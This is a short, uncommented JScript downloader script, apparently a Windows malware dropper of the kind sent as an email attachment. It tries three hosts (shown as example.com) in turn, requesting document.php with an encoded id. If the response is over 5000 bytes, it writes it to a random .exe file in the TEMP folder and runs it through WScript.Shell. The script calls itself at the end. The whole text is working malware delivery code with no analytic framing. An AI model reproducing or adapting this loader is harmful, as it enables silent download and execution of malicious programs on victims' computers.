function dl(fr) {
    const b = ['example.com', 'example.com', 'example.com'];
    for (var i = 0; i < 3; i++) {
        const ws = new ActiveXObject('WScript.Shell');
        const fn = ws.ExpandEnvironmentStrings('%TEMP%') + '\\' + Math.round(Math.random() * 100000000) + '.exe';
        var dn = 0;
        const xo = new ActiveXObject('MSXML2.XMLHTTP');
        xo.onreadystatechange = function() {
            if (xo.readyState == 4 && xo.status == 200) {
                const xa = new ActiveXObject('ADODB.Stream');
                xa.open();
                xa.type = 1;
                xa.write(xo.ResponseBody);
                if (xa.size > 5000) {
                    dn = 1;
                    xa.position = 0;
                    xa.saveToFile(fn, 2);
                    try {
                        ws.Run(fn, 1, 0);
                    } catch (er) {};
                };
                xa.close();
            };
        };
        try {
            xo.open('GET', 'http://' + b[i] + '/document.php?rnd=' + fr + '&id=5557545E0D0A020B24060108130B0B000A1D4A070B09', false);
            xo.send();
        } catch (er) {};
        if (dn == 1) break;
    };
};
_download = "Yes";
dl(6441);
